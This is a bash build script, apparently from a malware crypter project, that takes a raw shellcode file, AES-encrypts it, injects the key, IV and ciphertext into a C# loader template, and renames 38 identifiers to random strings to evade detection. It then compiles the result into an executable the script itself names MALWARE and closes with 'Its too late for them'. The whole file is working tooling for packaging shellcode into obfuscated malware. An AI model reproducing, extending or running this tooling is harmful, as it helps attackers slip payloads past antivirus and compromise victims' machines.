echo -e "Made by Bradonja Ljuti"
echo -e "Enter The Path To Your Shellcode File. File needs to be raw binary file otherwise it wont work"
echo ""
read Shellcode
echo -e "Name the output portable executable"
echo ""
read MALWARE
echo ""
python3 aesencrypt.py $Shellcode > shell.txt
cp shell.txt shell2.txt
keys=$(cat "shell2.txt")
head -n 1 shell.txt | cut -d $'\n' -f 1 > shell3.txt
keysnow=$(cat shell3.txt)
sed -i "s/KEYVAL/$keysnow/g" test.cs
sleep 2
head -n 2 shell.txt | cut -d $'\n' -f 2 > shell4.txt
perl -pe 's/PAYVAL/`cat shell4.txt`/ge' -i test.cs
sleep 2
head -n 3 shell.txt | cut -d $'\n' -f 3 > shell5.txt
perl -pe 's/IVVAL/`cat shell5.txt`/ge' -i test.cs
sleep 2
sed '1,3d;$d' shell.txt > shell6.txt
perl -pe 's/ENKEY/`cat shell6.txt`/ge' -i test.cs
sleep 3
tail -n1 shell.txt > shell7.txt
perl -pe 's/IVKEY/`cat shell7.txt`/ge' -i test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno1/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-12} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno2/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-20} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno3/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno4/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno5/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno6/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-16} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno7/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno8/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-26} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno9/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-12} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno10/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno11/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno12/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-25} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno13/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno14/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno15/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno16/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno17/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno18/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-25} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno19/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-28} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno20/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-29} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno21/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-22} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno22/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-23} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno23/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-20} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno24/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-24} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno25/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-25} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno26/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-26} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno27/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-21} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno28/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-29} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno29/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-24} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno30/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno31/$Random2/g" test.cs
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-19} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno32/$Random2/g" test.cs 
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-86} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno33/$Random2/g" test.cs 
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-13} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno34/$Random2/g" test.cs 
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno35/$Random2/g" test.cs 
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-25} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno36/$Random2/g" test.cs 
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno37/$Random2/g" test.cs 
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-14} | head -n 1 > slovo.txt
Random2=$(cat slovo.txt)
sed -i "s/Slucajno38/$Random2/g" test.cs 
rm -rf *.txt
sleep 2
mcs -out:$MALWARE test.cs>/dev/null 2>&1
rm -rf $MALWARE.mdb
echo "Its too late for them"
